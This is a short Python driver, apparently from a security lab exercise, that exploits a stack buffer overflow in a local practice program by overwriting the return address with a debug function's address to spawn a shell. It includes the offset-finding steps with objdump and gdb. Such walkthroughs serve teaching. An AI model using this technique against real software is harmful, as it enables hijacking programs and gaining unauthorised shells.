"""
To use:
$ (python bufferOverflowDriver.py; cat) | ./bufferOverflow

The parens and cat keep file descriptors open.

password: !! SPAWNING SHELL !!
ls
bufferOverflow    bufferOverflow.core      formatString.c
bufferOverflow.c  bufferOverflowDriver.py  README.md


To get address of 'debug' function:
$ objdump -d ./bufferOverflow | less
Then, search for /'<debug>':
08049196 <debug>:

To find how many A's to overwrite return address,
start with 64 (buf size) then add unique letters:
A*64BBBBCCCCDDDDEEEEFFFF

After segv, open core file in gdb:
$ gdb -c ./bufferOverflow.core
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x45454545 in ?? ()

0x45 = 'E'

"""

import sys


def main():
    # first E overflows, so go to DDDD
    payload = b'A'*64 + b'BBBBCCCCDDDD'

    # append 'debug' function address (0x08049196)
    payload += b'\x08\x04\x91\x96'[::-1]

    # python command to write buffer to stdout
    sys.stdout.buffer.write(payload)

if __name__ == '__main__':
    main()
